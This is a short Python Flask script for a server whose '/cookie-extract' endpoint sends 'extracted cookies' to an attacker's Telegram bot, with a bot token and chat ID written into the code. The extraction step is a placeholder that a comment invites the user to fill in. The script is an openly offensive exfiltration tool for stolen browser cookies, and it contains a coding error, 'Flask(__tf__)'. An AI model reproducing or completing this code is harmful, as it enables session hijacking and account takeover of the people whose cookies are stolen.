from flask import Flask, request
import requests

app = Flask(__tf__)

# Replace with your actual Telegram Bot API token and Chat ID
bot_token = '8007347207:AAEIHhGCxG7jdvAqW3ppN4Ac9RnxifB1QF4'  # Replace with your bot token
chat_id = '7006569478'  # Replace with your chat ID

# Function to send cookies to Telegram Bot
def send_cookies_to_telegram(cookies):
    url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
    message = f"Extracted Cookies: {cookies}"
    payload = {'chat_id': chat_id, 'text': message}
    response = requests.post(url, data=payload)
    return response.json()

@app.route('/cookie-extract', methods=['GET'])
def extract_cookies():
    # Here you can implement your logic for extracting cookies
    # For now, this is a placeholder for cookies
    cookies = "sample_cookie_value_here"  # Placeholder for extracted cookies
    
    # Send the cookies to Telegram bot
    response = send_cookies_to_telegram(cookies)
    
    # Return a confirmation response to the user
    return "Cookies have been sent to Telegram bot."

# Run the server
if __name__ == "__main__":
    app.run(host='0.0.0.0', port=80)
